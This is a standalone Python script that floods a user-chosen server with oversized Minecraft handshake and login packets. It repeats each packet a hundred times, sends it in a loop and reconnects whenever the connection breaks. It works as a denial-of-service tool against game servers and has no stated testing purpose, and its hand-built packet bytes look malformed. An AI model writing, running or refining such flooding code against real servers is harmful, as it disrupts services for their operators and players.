import socket

# Get user input for server IP, port, and number of packets
server_ip = input("Enter the server IP address: ")
server_port = int(input("Enter the server port: "))
packet_count = int(input("Enter the number of packets to send: "))

# Example heavy data packet: A Minecraft handshake and login request packet
def create_minecraft_packet():
    # Example data based on Minecraft protocol:
    # This includes a simple handshake packet and a login start packet.
    
    # Handshake packet (client version, address, port, next state)
    handshake_packet = b'\x00\x47\x02\x07localhost\x63\xdd\x021.20.1\2322'  # Modify as needed
    # Login Start packet with a sample username
    login_start_packet = b'\x00\x05\x00\x07tanjil448585757575757755775757574'  # Replace 'username' with a large name if you want
    
    # Combining handshake and login start packet to make it heavier
    heavy_packet = handshake_packet + login_start_packet
    
    # Repeating the packet data to increase the payload size
    heavy_packet *= 100  # Multiplies the data to make the payload significantly larger
    
    return heavy_packet

# Send heavy data packets
def connect_to_server(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print(f"Connected to {ip}:{port}")
    return s

while True:
    try:
        sock = connect_to_server(server_ip, server_port)
        heavy_packet = create_minecraft_packet()

        for i in range(packet_count):
            try:
                # Send the packet to the server
                sock.sendall(heavy_packet)
                print(f"Heavy Packet {i + 1}/{packet_count} sent to the server")

                # Receive a response (if the server sends one)
                response = sock.recv(1024)  # Buffer size of 1024 bytes
                print(f"Received response: {response}")

            except BrokenPipeError:
                print(f"Broken pipe encountered. Reconnecting...")
                sock.close()
                sock = connect_to_server(server_ip, server_port)

    except Exception as e:
        print(f"An error occurred: {e}")
        break  # Break the loop if there's a critical error

    finally:
        # Close the socket when done or if an error occurs
        sock.close()
        print("Connection closed")
